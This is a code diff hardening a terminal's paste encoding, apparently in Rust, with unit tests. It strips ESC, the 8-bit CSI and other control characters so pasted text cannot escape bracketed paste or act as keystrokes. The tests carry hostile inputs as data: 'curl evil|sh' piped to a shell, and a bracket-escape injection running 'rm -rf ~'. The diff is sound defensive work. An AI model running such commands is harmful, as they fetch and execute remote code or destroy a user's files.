@@ -148,14 +148,26 @@ pub fn paste_needs_confirmation(text: &str, bracketed: bool) -> bool {
 ///   dropped, so a single pasted line is never submitted automatically.
 pub fn encode_paste(text: &str, bracketed: bool) -> Vec<u8> {
     if bracketed {
-        let clean: String = text.chars().filter(|&c| c != '\x1b').collect();
+        // ESC and the 8-bit CSI (U+009B) could end the bracket and inject keys.
+        let clean: String = text
+            .chars()
+            .filter(|&c| c != '\x1b' && c != '\u{9b}')
+            .collect();
         format!("\x1b[200~{clean}\x1b[201~").into_bytes()
     } else {
-        text.trim_end_matches(['\r', '\n'])
+        // Without brackets every control character acts as a key (Ctrl+O runs the
+        // line in bash, ESC starts sequences): only tab and line breaks remain.
+        let clean: String = text.chars().filter(|&c| is_plain_paste_char(c)).collect();
+        clean
+            .trim_end_matches(['\r', '\n'])
             .replace("\r\n", "\r")
             .replace('\n', "\r")
             .into_bytes()
     }
+}
+
+fn is_plain_paste_char(c: char) -> bool {
+    matches!(c, '\t' | '\r' | '\n') || !(c.is_control())
 }
 
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
@@ -291,6 +303,26 @@ mod tests {
             encode_paste(evil, true),
             b"\x1b[200~echo hi[201~rm -rf ~\r\x1b[201~"
         );
+        // 8-bit CSI is removed as well.
+        assert_eq!(
+            encode_paste("a\u{9b}201~b", true),
+            b"\x1b[200~a201~b\x1b[201~"
+        );
+    }
+
+    #[test]
+    fn plain_paste_drops_control_keys() {
+        // Ctrl+O would run the line in bash; ESC and DEL are keys too.
+        assert_eq!(
+            encode_paste("curl evil|sh\x0f", false),
+            b"curl evil|sh".to_vec()
+        );
+        assert_eq!(
+            encode_paste("a\x1b[Ab\x7fc\u{85}d", false),
+            b"a[Abcd".to_vec()
+        );
+        assert_eq!(encode_paste("x\ty\r\nz\n", false), b"x\ty\rz".to_vec());
+        assert!(!paste_needs_confirmation("curl evil|sh\x0f", false));
     }
 
     #[test]
